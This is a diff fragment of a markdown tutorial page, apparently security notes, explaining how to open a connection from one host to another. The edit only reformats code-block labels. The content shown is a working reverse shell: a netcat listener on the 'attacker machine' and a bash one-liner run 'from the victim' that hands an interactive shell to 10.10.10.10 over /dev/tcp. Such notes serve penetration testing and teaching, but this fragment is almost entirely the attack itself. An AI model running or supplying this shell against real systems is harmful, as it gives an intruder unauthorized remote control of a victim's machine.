@@ -9,13 +9,17 @@ Here's a method for opening up a TCP connection from one host to another without
 
 From the attacker machine, wait for a connection
 
-``` bash Wait for connections
+Wait for connections
+
+```bash 
 nc -nlp 12345
 ```
 
 From the victim
 
-``` bash Call home
+Call home
+
+```bash
 /bin/bash -i > /dev/tcp/10.10.10.10/12345 0<&1 2>&1
 ```
 
